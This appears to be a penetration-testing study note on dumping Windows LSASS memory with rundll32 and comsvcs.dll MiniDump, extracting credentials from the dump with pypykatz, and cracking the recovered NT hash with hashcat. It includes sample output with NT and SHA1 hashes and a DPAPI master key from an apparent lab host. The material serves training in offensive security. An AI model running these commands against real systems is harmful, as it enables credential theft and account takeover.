## Dumping LSASS Process Memory
![[Pasted image 20240723123804.png]]
A file called `lsass.DMP` is created and saved in:
```cmd
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
#### Rundll32.exe & Comsvcs.dll Method
- We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). 
- This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line.
#### Finding LSASS PID in cmd
```cmd
tasklist /svc
```
#### Finding LSASS PID in PowerShell
```powershell
Get-Process lsass
```
#### Creating lsass.dmp using PowerShell
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
## Pypykatz to Extract Credentials
```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
#### MSV
- [MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
- Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory.
```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```
#### WDIGEST
- `WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. 
- LSASS caches credentials used by WDIGEST in clear-text.
```
== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```
#### Kerberos
- [Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. 
- Domain user accounts are granted tickets upon authentication with Active Directory.
```
== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```
#### DPAPI
- The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.
```
== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
#### Cracking the NT Hash with Hashcat
```shell
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```